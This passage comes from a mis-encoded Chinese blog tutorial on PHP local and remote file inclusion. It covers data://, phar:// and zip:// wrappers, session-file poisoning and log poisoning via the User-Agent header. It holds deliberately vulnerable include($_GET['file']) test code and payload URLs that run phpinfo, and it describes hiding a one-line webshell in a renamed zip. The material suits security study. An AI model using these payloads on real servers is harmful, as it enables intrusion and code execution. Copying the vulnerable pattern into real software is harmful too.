        &lt;td&gt;å¯é€‰&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;&amp;lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&amp;gt;&lt;/td&gt;
        &lt;td&gt;ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚&lt;/td&gt;
        &lt;td&gt;&amp;nbsp;&lt;/td&gt;
    &lt;/tr&gt;
&lt;/table&gt;
&lt;p&gt;è¿‡æ»¤å™¨è¯¦è§£&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDYjdDg=&#34;&gt; https://blog.csdn.net/ni9htmar3/article/details/69812306#t8&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;fileä¼ªåè®®è¯»å–æ–‡ä»¶å†…å®¹&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fileä¼ªåè®®è¯»å–æ–‡ä»¶å†…å®¹&#34;&gt;#&lt;/a&gt; file:// ä¼ªåè®® (è¯»å–æ–‡ä»¶å†…å®¹)&lt;/h2&gt;
&lt;p&gt;é€šè¿‡ file åè®®å¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œè¯»å–åˆ°æ–‡ä»¶çš„å†…å®¹&lt;/p&gt;
&lt;p&gt;æµ‹è¯•ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image025.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;dataä¼ªåè®®&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dataä¼ªåè®®&#34;&gt;#&lt;/a&gt; data:// ä¼ªåè®®&lt;/h2&gt;
&lt;p&gt;æ•°æ®æµå°è£…å™¨ï¼Œå’Œ php:// ç›¸ä¼¼éƒ½æ˜¯åˆ©ç”¨äº†æµçš„æ¦‚å¿µï¼Œå°†åŸæœ¬çš„ include çš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æµä¸­ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ‰§è¡Œæ–‡ä»¶çš„åŒ…å«æ–¹æ³•åŒ…å«äº†ä½ çš„è¾“å…¥æµï¼Œé€šè¿‡ä½ è¾“å…¥ payload æ¥å®ç°ç›®çš„ï¼›  &lt;code&gt;data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;data://ï¼ˆè¯»å–æ–‡ä»¶ï¼‰&lt;br /&gt;
å’Œ php ä¼ªåè®®çš„ input ç±»ä¼¼ï¼Œç¢°åˆ° file_get_contents () æ¥ç”¨ï¼› &lt;?php // æ‰“å° &#34;I love PHP&#34; echo file_get_contents(&#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39;); ?&gt;&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼š&amp;lt;span style=&amp;quot;color: rgb (121, 121, 121);&amp;quot;&amp;gt;&amp;lt;?php phpinfo ();, è¿™ç±»æ‰§è¡Œä»£ç æœ€åæ²¡æœ‰ï¼Ÿ&amp;gt;&amp;lt;/span &amp;gt; é—­åˆï¼›&lt;/p&gt;
&lt;p&gt;å¦‚æœ php.ini é‡Œçš„ allow_url_include=Onï¼ˆPHP &amp;lt; 5.3.0ï¼‰, å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼ŒåŒç†åœ¨è¿™å°±å¯ä»¥ç†è§£æˆè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ æµ‹è¯•ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;payload:  &lt;code&gt;http://192.168.199.130/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image026.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;pharä¼ªåè®®&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pharä¼ªåè®®&#34;&gt;#&lt;/a&gt; phar:// ä¼ªåè®®&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªå‚æ•°æ˜¯å°±æ˜¯ php è§£å‹ç¼©åŒ…çš„ä¸€ä¸ªå‡½æ•°ï¼Œä¸ç®¡åç¼€æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¼šå½“åšå‹ç¼©åŒ…æ¥è§£å‹ã€‚&lt;br /&gt;
ç”¨æ³•ï¼š?file=phar:// å‹ç¼©åŒ… / å†…éƒ¨æ–‡ä»¶ phar://xxx.png/shell.phpã€‚&lt;br /&gt;
æ³¨æ„ï¼š PHP &amp;gt; =5.3.0 å‹ç¼©åŒ…éœ€è¦æ˜¯ zip åè®®å‹ç¼©ï¼Œrar ä¸è¡Œï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚&lt;br /&gt;
æ­¥éª¤ï¼š å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ shell.phpï¼Œç„¶åç”¨ zip åè®®å‹ç¼©ä¸º shell.zipï¼Œç„¶åå°†åç¼€æ”¹ä¸º png ç­‰å…¶ä»–æ ¼å¼ã€‚&lt;/p&gt;
&lt;p&gt;æµ‹è¯•ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;æ²¡æœ‰å®éªŒå®Œæˆï¼Œå…ˆæŒ–ä¸ªå‘ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;zipä¼ªåè®®&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#zipä¼ªåè®®&#34;&gt;#&lt;/a&gt; zip:// ä¼ªåè®®&lt;/h2&gt;
&lt;p&gt;zip ä¼ªåè®®å’Œ phar åè®®ç±»ä¼¼ï¼Œä½†æ˜¯ç”¨æ³•ä¸ä¸€æ ·ã€‚&lt;br /&gt;
ç”¨æ³•ï¼š?file=zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å] zip://xxx.png#shell.phpã€‚&lt;br /&gt;
æ¡ä»¶ï¼š PHP &amp;gt; =5.3.0ï¼Œæ³¨æ„åœ¨ windows ä¸‹æµ‹è¯•è¦ 5.3.0&amp;lt;PHP&amp;lt;5.4 æ‰å¯ä»¥ #åœ¨æµè§ˆå™¨ä¸­è¦ç¼–ç ä¸º %23ï¼Œå¦åˆ™æµè§ˆå™¨é»˜è®¤ä¸ä¼šä¼ è¾“ç‰¹æ®Šå­—ç¬¦ã€‚&lt;/p&gt;
&lt;p&gt;æµ‹è¯•ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;æ²¡æœ‰å®éªŒå®Œæˆï¼Œå…ˆæŒ–ä¸ªå‘ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;å°è£…åè®®æ‘˜è¦&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#å°è£…åè®®æ‘˜è¦&#34;&gt;#&lt;/a&gt; å°è£…åè®®æ‘˜è¦&lt;/h2&gt;
&lt;table&gt;
    &lt;tr&gt;
        &lt;th&gt;å±æ€§&lt;/th&gt;
        &lt;th&gt;æ”¯æŒ&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;å—é™äº allow_url_include&lt;/td&gt;
        &lt;td&gt;ä»… &lt;em&gt;php://input&lt;/em&gt;ã€ &lt;em&gt;php://stdin&lt;/em&gt;ã€ &lt;em&gt;php://memory&lt;/em&gt; å’Œ &lt;em&gt;php://temp&lt;/em&gt;ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;å…è®¸è¯»å–&lt;/td&gt;
        &lt;td&gt;ä»… &lt;em&gt;php://stdin&lt;/em&gt;ã€ &lt;em&gt;php://input&lt;/em&gt;ã€ &lt;em&gt;php://fd&lt;/em&gt;ã€ &lt;em&gt;php://memory&lt;/em&gt; å’Œ &lt;em&gt;php://temp&lt;/em&gt;ã€‚
        &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;å…è®¸å†™å…¥&lt;/td&gt;
        &lt;td&gt;ä»… &lt;em&gt;php://stdout&lt;/em&gt;ã€ &lt;em&gt;php://stderr&lt;/em&gt;ã€ &lt;em&gt;php://output&lt;/em&gt;ã€ &lt;em&gt;php://fd&lt;/em&gt;ã€
            &lt;em&gt;php://memory&lt;/em&gt; å’Œ &lt;em&gt;php://temp&lt;/em&gt;ã€‚
        &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;å…è®¸è¿½åŠ &lt;/td&gt;
        &lt;td&gt;ä»… &lt;em&gt;php://stdout&lt;/em&gt;ã€ &lt;em&gt;php://stderr&lt;/em&gt;ã€ &lt;em&gt;php://output&lt;/em&gt;ã€ &lt;em&gt;php://fd&lt;/em&gt;ã€
            &lt;em&gt;php://memory&lt;/em&gt; å’Œ &lt;em&gt;php://temp&lt;/em&gt;ï¼ˆç­‰äºå†™å…¥ï¼‰
        &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;å…è®¸åŒæ—¶è¯»å†™&lt;/td&gt;
        &lt;td&gt;ä»… &lt;em&gt;php://fd&lt;/em&gt;ã€ &lt;em&gt;php://memory&lt;/em&gt; å’Œ &lt;em&gt;php://temp&lt;/em&gt;ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;æ”¯æŒ stat()&lt;/td&gt;
        &lt;td&gt;ä»… &lt;em&gt;php://memory&lt;/em&gt; å’Œ &lt;em&gt;php://temp&lt;/em&gt;ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;ä»…ä»…æ”¯æŒ stream_select()&lt;/td&gt;
        &lt;td&gt;&lt;em&gt;php://stdin&lt;/em&gt;ã€ &lt;em&gt;php://stdout&lt;/em&gt;ã€ &lt;em&gt;php://stderr&lt;/em&gt;ã€ &lt;em&gt;php://fd&lt;/em&gt; å’Œ &lt;em&gt;php://temp&lt;/em&gt;ã€‚
        &lt;/td&gt;
    &lt;/tr&gt;
&lt;/table&gt;
&lt;h1 id=&#34;æ–‡ä»¶åŒ…å«å§¿åŠ¿&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æ–‡ä»¶åŒ…å«å§¿åŠ¿&#34;&gt;#&lt;/a&gt; æ–‡ä»¶åŒ…å«å§¿åŠ¿&lt;/h1&gt;
&lt;h2 id=&#34;æ–‡ä»¶åŒ…å«session&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æ–‡ä»¶åŒ…å«session&#34;&gt;#&lt;/a&gt; æ–‡ä»¶åŒ…å« session&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;åˆ©ç”¨æ¡ä»¶ï¼š&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;session çš„å­˜å‚¨ä½ç½®å¯ä»¥è·å–ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é€šè¿‡ phpinfo çš„ä¿¡æ¯å¯ä»¥è·å–åˆ° session çš„å­˜å‚¨ä½ç½®ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é€šè¿‡ phpinfo çš„ä¿¡æ¯ï¼Œè·å–åˆ° session.save_path ä¸º /var/lib/php5/ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;å¦ä¸€ç§åªèƒ½çŒœæµ‹äº†&lt;br /&gt;
æ ¹æ®å„ç‰ˆæœ¬çš„ä¸­é—´ä»¶çŒœæµ‹ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;session ä¸­çš„å†…å®¹å¯ä»¥è¢«æ§åˆ¶ï¼Œä¼ å…¥æ¶æ„ä»£ç ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;span&gt;ç¤ºä¾‹ä»£ç &lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$s&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;str&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;s&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$s&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;æ¼æ´åˆ†æ&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;æ­¤ php ä¼šå°†è·å–åˆ°çš„ GET å‹ ctfs å˜é‡çš„å€¼å­˜å…¥åˆ° session ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;å½“è®¿é—® http://www.xxx.com/x.php?str=666 åï¼Œä¼šåœ¨ /var/lib/php5 ç›®å½•ä¸‹å­˜å‚¨ session çš„å€¼ã€‚&lt;/p&gt;
&lt;p&gt;session çš„æ–‡ä»¶åä¸º sess_+sessionidï¼Œsessionid å¯ä»¥é€šè¿‡å¼€å‘è€…æ¨¡å¼è·å–ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥ session çš„æ–‡ä»¶åä¸º sess_88565500f4af7f5e934c59c0ba643a60&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image005.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;åˆ°æœåŠ¡å™¨çš„ /var/lib/php/session ç›®å½•ä¸‹æŸ¥çœ‹æœç„¶å­˜åœ¨æ­¤æ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ° 666 å·²ç»å­˜é‡Œé¢äº†&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;æ¼æ´åˆ©ç”¨&lt;/span&gt;&lt;br /&gt;
é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥çŸ¥é“ str ä¼ å…¥çš„å€¼ä¼šå­˜å‚¨åˆ° session æ–‡ä»¶ä¸­ï¼Œå¦‚æœå­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡ str å†™å…¥æ¶æ„ä»£ç åˆ° session æ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œæ­¤æ¶æ„ä»£ç  getshellã€‚&lt;/p&gt;
&lt;p&gt;å½“è®¿é—® http://www.xxx.com/x.php?str=&amp;lt;?php phpinfo ();?&amp;gt; åï¼Œä¼šåœ¨ /var/lib/php5 ç›®å½•ä¸‹å­˜å‚¨ session çš„å€¼ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image006.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;ç»“æœ&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image007.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;æ–‡ä»¶åŒ…å«æ—¥å¿—&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#æ–‡ä»¶åŒ…å«æ—¥å¿—&#34;&gt;#&lt;/a&gt; æ–‡ä»¶åŒ…å«æ—¥å¿—&lt;/h2&gt;
&lt;p&gt;åˆ©ç”¨æ¡ä»¶ï¼šéœ€è¦çŸ¥é“æœåŠ¡å™¨æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ï¼Œä¸”æ—¥å¿—æ–‡ä»¶å¯è¯»ã€‚&lt;/p&gt;
&lt;p&gt;å¾ˆå¤šæ—¶å€™ï¼Œweb æœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œæ¯”å¦‚è¯´ apacheã€‚åœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼Œä¼šå°†è¯·æ±‚å†™å…¥ access.logï¼Œå½“å‘ç”Ÿé”™è¯¯æ—¶å°†é”™è¯¯å†™å…¥ error.logã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ—¥å¿—ä¿å­˜è·¯å¾„åœ¨ /var/log/apache2/ã€‚&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label danger&#34;&gt;ğŸ’”å¿…é¡»è¦æ›´æ”¹æ•°æ®åŒ…çš„è®¿é—®è¯·æ±‚æ‰è¡Œï¼Œä¸ç„¶åœ¨æ—¥å¿—æ–‡ä»¶é‡Œä¼šè¢«è½¬ç ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;ç¤ºä¾‹&lt;/span&gt;&lt;br /&gt;
&lt;img data-src=&#34;image014.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;âœ”ï¸è¿˜å¯ä»¥åœ¨ User-Agent é‡Œæ’å…¥ payload&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image015.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label danger&#34;&gt;ğŸ’”æœ‰çš„æ—¥å¿—æ–‡ä»¶é‡Œä¸ä¸€å®šä¼šæ˜¾ç¤º UA ä¿¡æ¯&lt;/span&gt;&lt;br /&gt;
&lt;span class=&#34;label info&#34;&gt;ç¤ºä¾‹&lt;/span&gt;&lt;br /&gt;
